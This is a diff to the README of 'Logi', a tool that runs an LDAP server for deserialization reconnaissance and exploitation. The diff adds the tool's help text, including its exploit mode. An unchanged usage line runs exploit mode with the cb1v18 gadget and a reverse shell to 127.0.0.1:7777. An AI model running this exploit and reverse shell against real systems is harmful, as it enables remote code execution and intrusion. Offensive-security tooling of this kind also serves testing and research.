@@ -6,12 +6,27 @@ Logi is a ldap server focusing on ldap deserialize recon and exploit.
   - [✨Get started](#get-started)
   - [⚙️How it work](#️how-it-work)
   - [🚀Examples](#examples)
+  - [🔮Image](#image)
   - [💻See also](#see-also)
 
 ## ✨Get started
 Download logi from release.
 Use `-h` to show help.
-![image](image/logi.png)
+```
+$ ./logi -h
+Logi is a ldap server focusing on ldap deserialize recon and exploit.
+
+Usage:
+  ./logi [flags]
+
+Flags:
+MODE CONFIG:
+   -m, -mode int  1 for poc, 2 for probe, 3 for exploit
+SERVE CONFIG:
+   -i, -ip string    ip for binding (default "0.0.0.0")
+   -p, -port string  port for binding (default "1389")
+...
+```
 
 ## ⚙️How it work
 Logi hosts a ldap service, waiting for ldap lookup
@@ -43,6 +58,8 @@ Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
 ```
 ./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
 ```
+## 🔮Image
+![image](image/logi.png)
 ## 💻See also
 [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
 
